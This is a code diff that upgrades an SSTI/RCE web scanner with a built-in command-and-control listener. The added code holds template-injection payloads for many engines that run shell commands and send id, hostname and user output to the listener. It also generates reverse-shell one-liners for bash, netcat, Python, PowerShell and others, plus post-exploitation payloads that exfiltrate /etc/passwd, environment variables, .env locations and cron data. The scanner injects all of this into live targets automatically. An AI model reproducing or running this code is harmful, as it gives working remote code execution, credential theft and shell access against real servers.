@@ -27,13 +27,18 @@ Improvements over v7:
 """
 import asyncio
 import aiohttp
+from aiohttp import web as _web
+import base64
 import json
 import re
+import socket
 import sys
 import random
 import string
 import time
 import hashlib
+import uuid
+import urllib.parse
 from pathlib import Path
 from urllib.parse import urlparse, quote, urljoin
 
@@ -340,6 +345,325 @@ def _remediation(engine: str) -> str:
         if key.lower() in engine.lower():
             return ENGINES_REMEDIATION[key] + "\n\n" + ENGINES_REMEDIATION["default"]
     return ENGINES_REMEDIATION["default"]
+
+
+# ── C2 (Command & Control) Controller ─────────────────────────────────────────
+
+class C2Controller:
+    """
+    Lightweight in-process HTTP C2 beacon server.
+
+    Starts a local aiohttp.web server that listens for callbacks from
+    successfully exploited SSTI/RCE payloads. Generates per-engine SSTI
+    payloads that curl/wget back to the listener with base64-encoded
+    command output (id, hostname, env, /etc/passwd).
+
+    Lifecycle:
+      1. c2 = C2Controller(); await c2.start()
+      2. Inject c2.gen_callback_payloads() via confirmed SSTI surface
+      3. If target is exploitable: callback received → c2.received_beacon()=True
+      4. c2.beacon_summary() returns decoded exfiltrated data
+      5. await c2.stop() → clean shutdown
+
+    Reverse shells are generated as report artifacts only — nothing is
+    auto-executed on the target.
+    """
+
+    def __init__(self):
+        self.token      = uuid.uuid4().hex[:16]
+        self.host_ip    = self._detect_ip()
+        self.port       = self._free_port()
+        self.callbacks: list[dict] = []
+        self._runner: _web.AppRunner | None = None
+
+    @property
+    def c2_url(self) -> str:
+        return f"http://{self.host_ip}:{self.port}"
+
+    @property
+    def beacon_url(self) -> str:
+        return f"{self.c2_url}/{self.token}"
+
+    # ── Setup ──────────────────────────────────────────────────────────────────
+
+    @staticmethod
+    def _detect_ip() -> str:
+        """Detect the local IP reachable by the target (best-effort)."""
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                s.connect(("8.8.8.8", 80))
+                return s.getsockname()[0]
+        except Exception:
+            return "127.0.0.1"
+
+    @staticmethod
+    def _free_port() -> int:
+        """Find a free TCP port."""
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("", 0))
+            return s.getsockname()[1]
+
+    async def start(self):
+        """Start the C2 HTTP listener as a background asyncio task."""
+        ctrl = self
+
+        async def _handle(request: _web.Request) -> _web.Response:
+            data: dict = {
+                "ts":      time.time(),
+                "remote":  request.remote or "unknown",
+                "method":  request.method,
+                "path":    str(request.path),
+                "query":   dict(request.rel_url.query),
+                "headers": {k: v for k, v in request.headers.items()
+                            if k.lower() not in ("host", "connection")},
+            }
+            try:
+                raw = await request.read()
+                if raw:
+                    data["body_hex"] = raw[:8192].hex()
+                    data["body"]     = raw[:8192].decode("utf-8", errors="replace")
+            except Exception:
+                pass
+            ctrl.callbacks.append(data)
+            return _web.Response(text="", status=204)
+
+        app = _web.Application()
+        app.router.add_route("*", f"/{self.token}",            _handle)
+        app.router.add_route("*", f"/{self.token}/{{tail:.*}}", _handle)
+        self._runner = _web.AppRunner(app, access_log=None)
+        await self._runner.setup()
+        site = _web.TCPSite(self._runner, "0.0.0.0", self.port,
+                            reuse_address=True, reuse_port=False)
+        await site.start()
+
+    async def stop(self):
+        """Tear down the C2 HTTP listener."""
+        if self._runner:
+            try:
+                await self._runner.cleanup()
+            except Exception:
+                pass
+
+    # ── Payload generation ─────────────────────────────────────────────────────
+
+    def gen_callback_payloads(self) -> list[tuple[str, str]]:
+        """
+        Generate per-engine SSTI payloads that exfiltrate id+hostname+whoami
+        to the C2 listener via curl/wget/python3.
+
+        Each tuple: (ssti_payload, engine_label).
+
+        Design: uses double-quotes for the URL (so single-quotes are free for
+        the popen() call), and base64-encodes all output to survive URL routing.
+        """
+        cb = self.beacon_url
+        # Use double-quoted URLs so popen('...') single-quotes are unambiguous
+        curl_exfil = (
+            f"curl -sk \"{cb}"
+            f"?d=$(id 2>/dev/null|base64 -w0 2>/dev/null||id 2>/dev/null|base64)"
+            f"&h=$(hostname 2>/dev/null|base64 -w0 2>/dev/null||hostname|base64)"
+            f"&u=$(whoami 2>/dev/null|base64 -w0 2>/dev/null)\" 2>/dev/null"
+        )
+        wget_exfil = (
+            f"wget -qO- \"{cb}"
+            f"?d=$(id 2>/dev/null|base64 -w0 2>/dev/null||id|base64)"
+            f"&h=$(hostname 2>/dev/null|base64 -w0 2>/dev/null)\" 2>/dev/null"
+        )
+        py3_exfil = (
+            f"python3 -c \"import urllib.request,base64,os;"
+            f"urllib.request.urlopen('{cb}"
+            f"?d='+base64.b64encode(os.popen('id').read().encode()).decode()"
+            f"+'&h='+base64.b64encode(os.popen('hostname').read().encode()).decode())\" 2>/dev/null"
+        )
+        py2_exfil = (
+            f"python -c \"import urllib2,base64,os;"
+            f"urllib2.urlopen('{cb}"
+            f"?d='+base64.b64encode(os.popen('id').read()))\" 2>/dev/null"
+        )
+        payloads: list[tuple[str, str]] = [
+            # ── Jinja2 ──────────────────────────────────────────────────────
+            (f"{{{{lipsum.__globals__.os.popen('{curl_exfil}').read()}}}}",                   "Jinja2-lipsum-curl"),
+            (f"{{{{cycler.__init__.__globals__.os.popen('{curl_exfil}').read()}}}}",          "Jinja2-cycler-curl"),
+            (f"{{{{config.__class__.__init__.__globals__['os'].popen('{curl_exfil}').read()}}}}", "Jinja2-config-curl"),
+            (f"{{{{joiner.__init__.__globals__.os.popen('{wget_exfil}').read()}}}}",          "Jinja2-joiner-wget"),
+            (f"{{{{namespace.__init__.__globals__.os.popen('{py3_exfil}').read()}}}}",        "Jinja2-namespace-py3"),
+            (f"{{{{lipsum.__globals__.os.popen('{py2_exfil}').read()}}}}",                    "Jinja2-lipsum-py2"),
+            # ── Twig (PHP) ──────────────────────────────────────────────────
+            (f"{{{{['{curl_exfil}']|filter('system')}}}}",                                    "Twig-system-filter"),
+            (f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{curl_exfil}')}}}}",
+                                                                                               "Twig-exec"),
+            (f"{{{{['{wget_exfil}']|map('system')|join}}}}",                                  "Twig-map-system"),
+            # ── FreeMarker (Java) ────────────────────────────────────────────
+            (f'${{"freemarker.template.utility.Execute"?new()("{curl_exfil}")}}',              "FreeMarker-Execute"),
+            (f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{curl_exfil}")}}', "FreeMarker-assign"),
+            # ── ERB (Ruby) ───────────────────────────────────────────────────
+            (f"<%= `{curl_exfil}` %>",                                                         "ERB-backtick"),
+            (f"<%= IO.popen('{curl_exfil}').read %>",                                          "ERB-IO-popen"),
+            (f"<% require 'open3'; Open3.popen3('{curl_exfil}') {{|i,o,e,t| t.value}} %>",   "ERB-open3"),
+            # ── Mako (Python) ────────────────────────────────────────────────
+            (f"<%! import os %><%=os.popen('{curl_exfil}').read()%>",                         "Mako-popen"),
+            # ── Velocity (Java) ──────────────────────────────────────────────
+            (f'#set($rt=$class.forName("java.lang.Runtime"))$rt.getRuntime().exec(["/bin/sh","-c","{curl_exfil}"])',
+                                                                                               "Velocity-exec"),
+            # ── Spring EL / Thymeleaf ─────────────────────────────────────────
+            (f'${{T(java.lang.Runtime).getRuntime().exec(new String[]{{"/bin/sh","-c","{curl_exfil}"}})}}',
+                                                                                               "Spring-EL"),
+            # ── Smarty (PHP) ─────────────────────────────────────────────────
+            (f"{{{{system('{curl_exfil}')}}}}",                                                "Smarty-system"),
+            (f"{{{{passthru('{curl_exfil}')}}}}",                                              "Smarty-passthru"),
+            # ── Handlebars / Nunjucks (Node.js) ──────────────────────────────
+            (f'{{{{range.constructor(\'return global.process.mainModule.require("child_process").execSync("{curl_exfil}").toString()\')()}}}}',
+                                                                                               "Nunjucks-execSync"),
+            # ── Blade (Laravel/PHP) ───────────────────────────────────────────
+            (f"@php system('{curl_exfil}'); @endphp",                                          "Blade-system"),
+            (f"{{!!passthru('{curl_exfil}')!!}}",                                              "Blade-raw"),
+            # ── Cheetah (Python) ─────────────────────────────────────────────
+            (f"#import os\n${{os.popen('{curl_exfil}').read()}}",                              "Cheetah-import"),
+        ]
+        return payloads
+
+    def gen_reverse_shells(self, lhost: str | None = None,
+                           lport: int = 4444) -> dict[str, str]:
+        """
+        Generate reverse shell one-liners for all major interpreters.
+        Included in findings as report artifacts — nothing is auto-executed.
+        lhost defaults to the C2 listener IP.
+        """
+        ip = lhost or self.host_ip
+        b64_bash = base64.b64encode(
+            f"/bin/bash -i >& /dev/tcp/{ip}/{lport} 0>&1".encode()
+        ).decode()
+        b64_py3 = base64.b64encode((
+            f"import socket,subprocess,os;"
+            f"s=socket.socket();s.connect(('{ip}',{lport}));"
+            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+            f"subprocess.call(['/bin/sh','-i'])"
+        ).encode()).decode()
+        return {
+            "bash":         f"bash -i >& /dev/tcp/{ip}/{lport} 0>&1",
+            "bash_b64":     f"echo {b64_bash}|base64 -d|bash",
+            "sh_devtcp":    f"0<&196;exec 196<>/dev/tcp/{ip}/{lport};sh <&196 >&196 2>&196",
+            "python3":      (
+                f"python3 -c 'import socket,subprocess,os;"
+                f"s=socket.socket();s.connect((\"{ip}\",{lport}));"
+                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
+            ),
+            "python3_b64":  f"python3 -c 'exec(__import__(\"base64\").b64decode(\"{b64_py3}\").decode())'",
+            "python2":      (
+                f"python -c 'import socket,subprocess,os;"
+                f"s=socket.socket();s.connect((\"{ip}\",{lport}));"
+                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
+            ),
+            "perl":         (
+                f"perl -e 'use Socket;$i=\"{ip}\";$p={lport};"
+                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
+                f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
+            ),
+            "ruby":         (
+                f"ruby -rsocket -e '"
+                f"c=TCPSocket.new(\"{ip}\",{lport});"
+                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
+            ),
+            "nc_e":         f"nc -e /bin/sh {ip} {lport}",
+            "nc_mkfifo":    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {lport} >/tmp/f",
+            "socat":        f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{lport}",
+            "php":          f"php -r '$sock=fsockopen(\"{ip}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            "curl_bash":    f"curl -sk http://{ip}:{lport}/sh|bash",
+            "wget_bash":    f"wget -qO- http://{ip}:{lport}/sh|bash",
+            "powershell":   (
+                f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{lport});"
+                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
+                f"{{$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);"
+                f"$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::UTF8).GetBytes($r+\\\"PS> \\\");"
+                f"$s.Write($rb,0,$rb.Length)}}\""
+            ),
+        }
+
+    def gen_post_exploit_payloads(self) -> list[tuple[str, str, str]]:
+        """
+        Generate post-exploitation exfiltration payloads (Jinja2 + curl).
+        Each tuple: (command_str, description, jinja2_payload).
+        Sends each command's output to /exfil sub-path via POST.
+        """
+        cb = self.beacon_url
+        commands = [
+            ("id && whoami && hostname && uname -a",
+             "system-identity"),
+            ("cat /etc/passwd 2>/dev/null",
+             "etc-passwd"),
+            ("cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'",
+             "proc-environ"),
+            ("env 2>/dev/null | sort",
+             "env-vars"),
+            ("find /app /var/www /home /opt -name '.env' -maxdepth 6 2>/dev/null | head -15",
+             "dotenv-files"),
+            ("cat /etc/hosts 2>/dev/null",
+             "etc-hosts"),
+            ("ls -la /app /var/www/html /home /tmp 2>/dev/null | head -30",
+             "directory-listing"),
+            ("netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null | head -20",
+             "open-ports"),
+            ("crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null | head -20",
+             "cron-jobs"),
+            ("cat /proc/net/tcp 2>/dev/null | head -20",
+             "kernel-tcp-table"),
+        ]
+        result: list[tuple[str, str, str]] = []
+        for cmd, desc in commands:
+            full_curl = (
+                f"curl -sk \"{cb}/exfil\" -X POST "
+                f"-d \"desc=$(echo '{desc}'|base64 -w0 2>/dev/null)&"
+                f"out=$({cmd} 2>&1|base64 -w0 2>/dev/null)\" 2>/dev/null"
+            )
+            jinja = f"{{{{lipsum.__globals__.os.popen('{full_curl}').read()}}}}"
+            result.append((cmd, desc, jinja))
+        return result
+
+    # ── Results ────────────────────────────────────────────────────────────────
+
+    def received_beacon(self) -> bool:
+        """True if any C2 callback was received."""
+        return bool(self.callbacks)
+
+    def beacon_summary(self) -> str:
+        """Human-readable summary of all received C2 callbacks with decoded data."""
+        if not self.callbacks:
+            return "No C2 callbacks received."
+        lines = [f"C2 CALLBACKS RECEIVED: {len(self.callbacks)}"]
+        for i, cb in enumerate(self.callbacks[:8], 1):
+            ts = time.strftime("%H:%M:%S", time.localtime(cb["ts"]))
+            lines.append(f"\n  Callback #{i} @ {ts} from {cb.get('remote', '?')}")
+            lines.append(f"    Path  : {cb.get('path', '')}")
+            q = cb.get("query", {})
+            for qk, label in [("d", "id output"), ("h", "hostname"), ("u", "whoami")]:
+                if q.get(qk):
+                    try:
+                        dec = base64.b64decode(q[qk] + "==").decode("utf-8", errors="replace").strip()
+                        lines.append(f"    {label:10}: {dec!r}")
+                    except Exception:
+                        lines.append(f"    {label:10}: {q[qk][:100]!r}")
+            # POST body (post-exploitation exfil)
+            body = cb.get("body", "")
+            if body:
+                try:
+                    parsed = dict(urllib.parse.parse_qsl(body))
+                    desc_raw = parsed.get("desc", "")
+                    out_raw  = parsed.get("out", "")
+                    desc_dec = base64.b64decode(desc_raw + "==").decode(errors="replace").strip() if desc_raw else ""
+                    out_dec  = base64.b64decode(out_raw  + "==").decode(errors="replace").strip() if out_raw  else ""
+                    if desc_dec:
+                        lines.append(f"    exfil [{desc_dec}]:")
+                    if out_dec:
+                        for line in out_dec.splitlines()[:10]:
+                            lines.append(f"      {line}")
+                except Exception:
+                    lines.append(f"    body  : {body[:200]!r}")
+        return "\n".join(lines)
 
 
 class SSTIScanner:
@@ -826,6 +1150,184 @@ class SSTIScanner:
                         return True
         return False
 
+    # ── C2 callback injection ─────────────────────────────────────────────────
+
+    async def test_c2_callback(self, sess, c2: C2Controller,
+                               endpoint: str) -> bool:
+        """
+        Inject C2 callback payloads across all confirmed SSTI surfaces.
+
+        Returns True if a live C2 beacon was received (OOB RCE proven).
+        The finding is added automatically with full reverse-shell artifacts.
+        """
+        print(f"\n[*] Injecting C2 callback payloads → {c2.beacon_url}")
+        print(f"    Token: {c2.token}  |  Local IP: {c2.host_ip}")
+
+        url          = self.target + endpoint
+        c2_payloads  = c2.gen_callback_payloads()
+
+        for payload, engine_label in c2_payloads:
+            if c2.received_beacon():
+                break
+            # Surface A: GET params
+            for param in GET_PARAMS[:8]:
+                await self._get(sess, url, params={param: payload})
+                await asyncio.sleep(0.12)
+                if c2.received_beacon():
+                    print(f"  [!!!] C2 BEACON via GET ?{param} — {engine_label}")
+                    break
+            if c2.received_beacon():
+                break
+            # Surface B: POST JSON body
+            for key in POST_JSON_KEYS[:5]:
+                await self._post(sess, url, json_data={key: payload})
+                await asyncio.sleep(0.10)
+                if c2.received_beacon():
+                    print(f"  [!!!] C2 BEACON via POST JSON .{key} — {engine_label}")
+                    break
+            if c2.received_beacon():
+                break
+            # Surface C: injected HTTP headers
+            for header in HEADER_INJECTION_TARGETS[:4]:
+                await self._get(sess, url, headers={header: payload})
+                await asyncio.sleep(0.10)
+                if c2.received_beacon():
+                    print(f"  [!!!] C2 BEACON via header {header} — {engine_label}")
+                    break
+
+        if c2.received_beacon():
+            rs = c2.gen_reverse_shells()
+            self._add(
+                ftype="C2_ESTABLISHED",
+                severity="CRITICAL",
+                conf=99,
+                proof=(
+                    "C2 LIVE CALLBACK CONFIRMED — target made outbound HTTP to our listener\n\n"
+                    f"  Listener : {c2.c2_url}\n"
+                    f"  Token    : {c2.token}\n"
+                    f"  Callbacks: {len(c2.callbacks)}\n\n"
+                    f"{c2.beacon_summary()}"
+                ),
+                detail=(
+                    "The target server made an unsolicited outbound HTTP request to the C2 "
+                    "listener proving live code execution — not just template rendering. "
+                    "base64-encoded id/hostname/whoami output received. "
+                    "Full server compromise is confirmed. Use the reverse-shell artifacts "
+                    "in 'extra.reverse_shells' to establish an interactive session."
+                ),
+                url=url,
+                engine=self._engine_confirmed or "Unknown",
+                reproducibility=(
+                    f"# 1. Start a netcat listener on your machine:\n"
+                    f"nc -lvnp 4444\n\n"
+                    f"# 2. Inject a reverse-shell payload (bash example):\n"
+                    f"#    Replace YOUR_IP and pick a shell from extra.reverse_shells\n"
+                    f"curl -s '{url}?q={{{{lipsum.__globals__.os.popen"
+                    f"(\"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\").read()}}}}'"
+                ),
+                extra={
+                    "c2_url":            c2.c2_url,
+                    "c2_token":          c2.token,
+                    "callbacks_count":   len(c2.callbacks),
+                    "c2_beacon_summary": c2.beacon_summary(),
+                    "reverse_shells":    rs,
+                    "post_exploit_cmds": [
+                        "cat /etc/passwd",
+                        "cat /proc/self/environ | tr '\\0' '\\n'",
+                        "env | sort",
+                        "find / -name '.env' -maxdepth 5 2>/dev/null",
+                        "ls -la /app /var/www /home 2>/dev/null",
+                        "netstat -tulnp 2>/dev/null",
+                        "crontab -l 2>/dev/null",
+                    ],
+                    "mitre_c2": "T1071.001 — Application Layer Protocol: Web Protocols",
+                    "surface": "c2_oob_callback",
+                },
+            )
+            return True
+
+        print("  [~] No C2 callback received (target may not have outbound access)")
+        return False
+
+    async def _post_exploitation(self, sess, c2: C2Controller,
+                                 endpoint: str):
+        """
+        After a C2 beacon is received, inject post-exploitation exfiltration
+        payloads that dump: /etc/passwd, env, process environ, cron, ports,
+        .env files, directory listings, and /etc/hosts.
+
+        All output is captured via POST callbacks to the C2 /exfil route.
+        """
+        print("\n[*] Running post-exploitation exfil via SSTI C2 channel...")
+        url     = self.target + endpoint
+        payloads = c2.gen_post_exploit_payloads()
+
+        pre_count = len(c2.callbacks)
+        for cmd, desc, jinja_payload in payloads:
+            print(f"    Exfil: {desc}...")
+            for param in GET_PARAMS[:4]:
+                await self._get(sess, url, params={param: jinja_payload})
+                await asyncio.sleep(0.25)
+
+        # Collect exfil callbacks (the ones posted to /exfil)
+        await asyncio.sleep(2)
+        exfil_cbs = [cb for cb in c2.callbacks[pre_count:]
+                     if "/exfil" in cb.get("path", "")]
+
+        exfil_data: dict[str, str] = {}
+        for cb in exfil_cbs:
+            body = cb.get("body", "")
+            if not body:
+                continue
+            try:
+                parsed   = dict(urllib.parse.parse_qsl(body))
+                desc_dec = base64.b64decode(
+                    parsed.get("desc", "") + "=="
+                ).decode(errors="replace").strip()
+                out_dec  = base64.b64decode(
+                    parsed.get("out",  "") + "=="
+                ).decode(errors="replace").strip()
+                if desc_dec and out_dec:
+                    exfil_data[desc_dec] = out_dec
+            except Exception:
+                if body:
+                    exfil_data[f"raw_{len(exfil_data)}"] = body[:400]
+
+        if not exfil_data:
+            print("    [~] No post-exfil callbacks received (firewall / no curl on target)")
+            return
+
+        proof_lines = [f"POST-EXPLOITATION EXFIL: {len(exfil_data)} data sources captured\n"]
+        for desc, output in exfil_data.items():
+            proof_lines.append(f"  [{desc}]:")
+            for ln in output.splitlines()[:15]:
+                proof_lines.append(f"    {ln}")
+            proof_lines.append("")
+
+        self._add(
+            ftype="POST_EXPLOITATION_EXFIL",
+            severity="CRITICAL",
+            conf=98,
+            proof="\n".join(proof_lines),
+            detail=(
+                f"Post-exploitation data successfully exfiltrated via SSTI C2 OOB channel. "
+                f"{len(exfil_data)} data sources captured: "
+                + ", ".join(exfil_data.keys())
+            ),
+            url=url,
+            engine=self._engine_confirmed or "Unknown",
+            reproducibility="See C2_ESTABLISHED finding for injection vector.",
+            extra={
+                "exfil_data":      exfil_data,
+                "exfil_sources":   list(exfil_data.keys()),
+                "c2_token":        c2.token,
+                "surface":         "post_exploitation_exfil",
+                "mitre_exfil":     "T1041 — Exfiltration Over C2 Channel",
+                "mitre_discovery": "T1083 — File and Directory Discovery",
+            },
+        )
+        print(f"    [+] Exfil complete — {len(exfil_data)} sources captured")
+
     # ── Discover injectable endpoints ──────────────────────────────────────────
 
     async def _discover_endpoints(self, sess) -> list[str]:
@@ -846,46 +1348,75 @@ class SSTIScanner:
 
     async def run(self):
         print("=" * 60)
-        print("  SSTI/RCE v8 — Massive Multi-Surface Scanner")
+        print("  SSTI/RCE v9 — Multi-Surface Scanner + Live C2 Integration")
         print(f"  Target: {self.target}")
         print("=" * 60)
 
-        conn = aiohttp.TCPConnector(limit=CONCURRENCY * 2, ssl=False)
+        # Start C2 listener before scan so it's ready to receive callbacks
+        c2: C2Controller | None = None
+        try:
+            c2 = C2Controller()
+            await c2.start()
+            print(f"\n[*] C2 listener ready: {c2.c2_url}/{c2.token}")
+        except Exception as exc:
+            c2 = None
+            print(f"\n[!] C2 listener unavailable: {exc} — continuing without C2")
+
+        conn    = aiohttp.TCPConnector(limit=CONCURRENCY * 2, ssl=False,
+                                       enable_cleanup_closed=True)
         timeout = aiohttp.ClientTimeout(total=30, connect=8)
-        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
-            print("\n[*] Discovering live endpoints...")
-            endpoints = await self._discover_endpoints(sess)
-            print(f"    Found {len(endpoints)} candidate endpoint(s): {endpoints[:5]}")
 
-            # Run all surface tests concurrently per endpoint
-            tasks = []
-            for ep in endpoints[:8]:
+        try:
+            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
+                print("\n[*] Discovering live endpoints...")
+                endpoints = await self._discover_endpoints(sess)
+                print(f"    Found {len(endpoints)} endpoint(s): {endpoints[:5]}")
+
+                # All surface tests concurrently per endpoint
+                tasks: list = []
+                for ep in endpoints[:8]:
+                    tasks += [
+                        self.test_get_params(sess, ep),
+                        self.test_post_json(sess, ep),
+                        self.test_post_form(sess, ep),
+                    ]
                 tasks += [
-                    self.test_get_params(sess, ep),
-                    self.test_post_json(sess, ep),
-                    self.test_post_form(sess, ep),
+                    self.test_header_injection(sess),
+                    self.test_cookie_injection(sess),
+                    self.test_path_injection(sess),
+                    self.test_graphql_injection(sess),
+                    self.test_xml_injection(sess),
                 ]
-            tasks += [
-                self.test_header_injection(sess),
-                self.test_cookie_injection(sess),
-                self.test_path_injection(sess),
-                self.test_graphql_injection(sess),
-                self.test_xml_injection(sess),
-            ]
-            await asyncio.gather(*tasks, return_exceptions=True)
+                await asyncio.gather(*tasks, return_exceptions=True)
 
-            # Blind timing test (sequential, timing-sensitive)
-            await self.test_blind_timing(sess)
+                # Blind timing (must be sequential — timing-sensitive)
+                await self.test_blind_timing(sess)
 
-            # If SSTI confirmed, attempt real RCE proof
-            if self.findings and self._engine_confirmed:
-                ep = endpoints[0]
-                await self._attempt_rce_proof(sess, "get", ep)
+                # RCE proof extraction
+                if self.findings and self._engine_confirmed:
+                    ep = endpoints[0]
+                    await self._attempt_rce_proof(sess, "get", ep)
 
-        rce_count = sum(1 for f in self.findings if "RCE" in f["type"])
+                # C2 callback injection (OOB live RCE proof)
+                if c2 and self.findings:
+                    ep       = endpoints[0]
+                    c2_hit   = await self.test_c2_callback(sess, c2, ep)
+                    if c2_hit:
+                        # Give the server a moment to send all exfil data
+                        await asyncio.sleep(4)
+                        await self._post_exploitation(sess, c2, ep)
+        finally:
+            if c2:
+                await c2.stop()
+
+        rce_count  = sum(1 for f in self.findings if "RCE"  in f["type"])
         ssti_count = sum(1 for f in self.findings if "SSTI" in f["type"])
-        print(f"\n[+] SSTI/RCE v8 complete: {len(self.findings)} findings "
-              f"({rce_count} RCE confirmed, {ssti_count} SSTI)")
+        c2_count   = sum(1 for f in self.findings
+                         if f["type"] in ("C2_ESTABLISHED", "POST_EXPLOITATION_EXFIL"))
+        print(
+            f"\n[+] SSTI/RCE v9 complete: {len(self.findings)} findings "
+            f"({rce_count} RCE confirmed, {ssti_count} SSTI, {c2_count} C2/exfil)"
+        )
         return self.findings
 
 
